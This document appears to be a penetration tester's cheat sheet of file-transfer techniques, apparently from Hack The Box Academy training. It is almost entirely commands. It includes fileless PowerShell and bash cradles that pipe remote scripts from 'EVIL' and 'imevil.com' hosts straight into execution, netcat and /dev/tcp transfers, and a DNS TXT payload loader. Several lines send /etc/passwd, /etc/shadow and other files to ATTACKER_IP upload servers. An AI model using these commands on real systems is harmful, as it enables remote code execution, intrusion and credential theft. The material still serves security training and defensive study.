

# Common Techniques

```python
// ----------------------------------------------------------------- Using Netcat  ----------------------------------------------------------------- //

// Listening on port 8000 on the victim machine
nc -l -p 8000 > SharpKatz.exe

// Sending a file to the victim
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

// Bash read write, sending a file using netcat and reading it using bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe

// on the victims end
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

// ----------------------------------------------------------------- Using remote desktop  ----------------------------------------------------------------- //
// rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

// xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer


// ----------------------------------------------------------------- Powershell  ----------------------------------------------------------------- //
// This is for scenarios where we need to use powershell but no HTTPS, HTTP or SMB are available
// Powershell Remoting

```


# Linux to windows 


```python
// ----------------------------------------------------------------- Downloading Linux to Windows ----------------------------------------------------------------- //


// --------------------- Base64 --------------------- // 

// On linux
cat id_rsa |base64 -w 0;echo

LS0tLS1CRUd[...]ktLS0tLQo=

// Over on windows
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUd[...]ktLS0tLQo="))


// --------------------- Powershell cradles --------------------- //
// Fileless
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")

// Fileless with powershell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

// Fileless also accepts pipes
(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1') | IEX

// SSL/TLS  
IEX(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1')
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

// hidden IE com object
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

// Msxml2.XMLHTTP COM object
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

// WinHttp COM object (not proxy aware!)
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText

// using bitstransfer- touches disk!
Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r

// DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
//   code to execute needs to be a base64 encoded string stored in a TXT record
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

// from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex



// ------------------------------------------ SMB Downloads ------------------------------------------ //

// To open an SMB share on linux
sudo impacket-smbserver share -smb2support /tmp/smbshare


// To copy a file from SMB Share on windows
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.



// If there is a guest access error then use the following
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

// Connect command
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

// Now the copy command once more
C:\htb> copy n:\nc.exe
        1 file(s) copied.




// ------------------------------------------ FTP Transfer ------------------------------------------ //
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21


// After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient

C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

// alternative method
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye


// ----------------------------------------------------------------- Uploading ----------------------------------------------------------------- //

// --------------------- Base64 From windows to linux--------------------- // 

// Encrypting a file on windows
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5[...]3N0DQo=


// Check the hash to see the files validity
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D


// Decrypting it over on linux
Hillside_1@htb[/htb]$ echo IyBDb3B5[...]3N0DQo= | base64 -d > hosts

//Checking the hash on linux
Hillside_1@htb[/htb]$ md5sum hosts 

3688374325b992def12793500307566d  hosts


// --------------------- Powershell Web uploads --------------------- // 

// Powershell doesnt have a built in function for upload operations, we can use invoke-webrequest or invoke-restmethod.
// Furthermore we need a webserver thatll accept uploads. We can use uploadserver which is an extended module of HTTP.server module
// now to run it! (this is using pip)
pip3 install uploadserver
python3 -m uploadserver

// or install with pipx
pipx install uploadserver
//then run
uploadserver

// Now we can use a PowerShell script (https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses Invoke-RestMethod to perform the upload operations
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373

// --------------------- Powershell Web uploads Base64 --------------------- // 
// Invoke-WebRequest or Invoke-restmethod can be used together with netcat to transfer base64 files 
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

// Here with linux we catch it with netcat
nc -lvnp 8000
listening on [any] 8000 ...
connect to [198.51.100.2] from (UNKNOWN) [10.2.10.20] 54020
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.169
Content-Type: application/x-www-form-urlencoded
Host: 198.51.100.2:8000
Content-Length: 1100
Expect: 100-continue
Connection: Keep-Alive

IyBDb3B5c[...]N0DQo=
 

// --------------------- SMB Uploads --------------------- // 










```





# Linux to Linux
 

```python
// ================================================================== Downloading Linux to Windows ================================================================== //


// --------------------- Base64 --------------------- // 

// On linux
cat id_rsa |base64 -w 0;echo

LS0tLS1CRUd[...]ktLS0tLQo=

// To decode 
echo -n 'LS0[...]Qo=' | base64 -d > id_rsa


// --------------------- LOLBins --------------------- //

// Using wget
wget https://imevil.com/script.sh -O script.sh

// Using curl
curl -o script.sh https://imevil.com/script.sh


// --------------------- Bash Transfer --------------------- //

// Connect to the target webserver
exec 3<>/dev/tcp/10.10.10.32/80

// HTTP GET Request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

// Print the response
cat <&3


// ========================================== Fileless Attacks ========================================== //

// Fileless bash scripts
  curl https://imevil.com/script.sh | bash

// Python fileless 
  wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3



// ========================================== SSH Transfer ========================================== //

// SCP Transfer for local download
scp user@192.168.49.128:/root/myroot.txt .

// SCP Transfer for upload
scp /home/user/evil.sh user@192.168.49.128:/home/user/evil.sh



// ========================================== Web Uploads ========================================== //
// Uploaserver as an extended module of python HTTP.Server
pipx install uploadserver
// or
sudo python3 -m pip install --user uploadserver

// then we need to create a self signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

// Now we can start the webserver
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

// Uploading files finally
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure









```






# Code for file transfer


```python
// ================================================================= Code ================================================================== //

// --------------------- Python --------------------- //
// Python2
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

// Python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

// Uploading with python code
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'


// --------------------- PHP --------------------- //

// An alternative to file_get_contents() and file_put_contents() is the fopen() module. We can use this module to open a URL, read its content and save it into a file.
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

// Using fopen
Hillside_1@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote =fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

// PHP download and pipe
Hillside_1@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

// ========================================== Misc languages ========================================== //

// --------------------- Ruby --------------------- //

// Download 
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

// Upload
ruby -e 'require "net/http"; uri=URI("http://ATTACKER_IP:PORT/upload"); req=Net::HTTP::Post.new(uri); req.body=File.read("LinEnum.sh"); Net::HTTP.start(uri.hostname, uri.port){|http| http.request(req)}'

// --------------------- Perl --------------------- //
// Download
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

// Upload
perl -MLWP::UserAgent -e '$ua=LWP::UserAgent->new; $ua->post("http://ATTACKER_IP:PORT/upload", Content=>do{local(@ARGV,$/)="LinEnum.sh";<>});'



// --------------------- JavaScript --------------------- //
// Downloadin with javascript!
// save all of this as wget.js or anything
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

// then run it with cscript.exe
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1


// Uploading with JavaScript (WSH + WinHttp)
// save as upload.js

var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
xhr.Open("POST", WScript.Arguments(0), false);
xhr.Send(new ActiveXObject("Scripting.FileSystemObject").OpenTextFile(WScript.Arguments(1)).ReadAll());

//cscript execution
cscript.exe /nologo upload.js http://ATTACKER_IP:PORT/upload PowerView.ps1



// --------------------- VBScript --------------------- //
// create a wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
	    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

// Now we run it with Cscript again!
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1

// Uploading now
' Uploading with VBScript (HTTP POST)
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("LinEnum.sh", 1)

data = file.ReadAll
file.Close

http.Open "POST", "http://ATTACKER_IP:PORT/upload", False
http.Send data

// csript
cscript.exe //nologo upload.vbs



```













